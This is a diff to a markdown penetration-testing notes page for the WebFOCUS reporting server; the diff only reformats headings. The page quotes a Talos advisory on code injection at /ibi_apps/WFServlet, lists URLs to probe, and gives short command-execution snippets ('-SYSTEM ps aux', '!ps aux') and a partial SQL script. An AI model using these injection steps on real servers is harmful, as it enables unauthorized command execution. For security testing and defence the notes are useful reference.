@@ -2,13 +2,13 @@
 
 WebFocus: http://infocenter.informationbuilders.com/wf81rel/index.jsp 
  
-### Vulnerabilities
+## Vulnerabilities
  
 From https://www.talosintelligence.com/vulnerability_reports/TALOS-2017-0315:
 *Code injection is achieved on the following URL: `/ibi_apps/WFServlet`
 By successfully injecting WebFOCUS code on this URL parameter while properly completing the expected syntax, an attacker can leverage the "! " statement of WebFOCUS which allows for system commands to be executed via the reporting module code.*
  
-### URLs to test
+## URLs to test
  
 | URL | Result|
 |-----|-------|
@@ -26,11 +26,12 @@ By successfully injecting WebFOCUS code on this URL parameter while properly com
 |/ibi_apps/rs/ibfs/EDA/NodeName/AppName?IBIRS_action=get|List the files within an application - relpace NodeName and AppName|
  
  
-### Script Notes
+## Script Notes
  
 A minimum script needed. It throws errors but still executes
  
 **Command Execution**
+
 ```
 -SYSTEM ps aux
 !ps aux
@@ -42,6 +43,7 @@ A minimum script needed. It throws errors but still executes
 ```	
 
 **SQL**
+
 ``` 
 - SET &ECHO=ALL
 
@@ -55,7 +57,7 @@ END
 -RUN
 ```
 
-### References
+## References
  
 Documentation: 
 - https://techsupport.informationbuilders.com/public/tc-library.html#collapseOne
